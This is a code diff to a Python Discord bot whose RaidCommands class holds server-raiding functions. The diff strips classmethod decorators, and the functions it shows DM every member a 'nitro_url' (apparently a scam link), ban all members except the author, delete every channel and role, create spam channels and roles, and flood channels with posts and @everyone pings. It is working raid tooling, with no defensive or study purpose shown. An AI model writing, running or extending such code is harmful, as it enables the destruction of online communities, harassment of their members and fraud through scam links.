@@ -1,5 +1,5 @@
 import random
-from disnake import DMChannel, Embed
+from disnake import Embed
 import asyncpraw
 import disnake
 from scripting import Scripts as SC
@@ -39,8 +39,7 @@ async def genreddit(amt: int, subreddit: str, subreddit2: str = None):
 
 
 class RaidCommands:
-    @classmethod
-    async def send_dm(cls, guild: disnake.Guild, embed: Embed = None, button: Button = None, nitro_url: str = None):
+    async def send_dm(guild: disnake.Guild, embed: Embed = None, button: Button = None, nitro_url: str = None):
 
         view = View()
 
@@ -64,40 +63,33 @@ class RaidCommands:
                 for mem in guild.members:
                     await mem.send(nitro_url)
 
-    @classmethod
-    async def ban_members(cls, guild: disnake.Guild, author: disnake.Member = None):
+    async def ban_members(guild: disnake.Guild, author: disnake.Member = None):
         for mem in guild.members:
             if mem is not author:
                 await mem.ban()
 
-    @classmethod
-    async def channel_remove(cls, guild: disnake.Guild):
+    async def channel_remove(guild: disnake.Guild):
         for ch in guild.channels:
             await ch.delete()
 
-    @classmethod
-    async def channel_make(cls, guild: disnake.Guild, amt: int):
+    async def channel_make(guild: disnake.Guild, amt: int):
         for _ in range(amt):
             await guild.create_text_channel(random.choice(zalgo_list))
 
-    @classmethod
-    async def role_remove(cls, guild: disnake.Guild):
+    async def role_remove(guild: disnake.Guild):
         for role in guild.roles:
             await role.delete()
 
-    @classmethod
-    async def role_make(cls, guild: disnake.Guild, amt: int):
+    async def role_make(guild: disnake.Guild, amt: int):
         for _ in range(amt):
             await guild.create_role(name=random.choice(zalgo_list))
 
-    @classmethod
-    async def role_give(cls, guild: disnake.Guild):
+    async def role_give(guild: disnake.Guild):
         for member in guild.members:
             for role in guild.roles:
                 await member.add_roles(role)
 
-    @classmethod
-    async def sfw_spam(cls, guild: disnake.Guild, amt: int):
+    async def sfw_spam(guild: disnake.Guild, amt: int):
         for _ in range(amt):
             for cha in guild.channels:
                 sfw_post = random.choice(sub_list)
@@ -107,8 +99,7 @@ class RaidCommands:
             if len(sub_list) < 5:
                 await genreddit(10, subreddit)
 
-    @classmethod
-    async def ping_spam(cls, guild: disnake.Guild, amt):
+    async def ping_spam(guild: disnake.Guild, amt):
         for _ in range(amt):
             for cha in guild.channels:
                 await cha.send(guild.default_role)
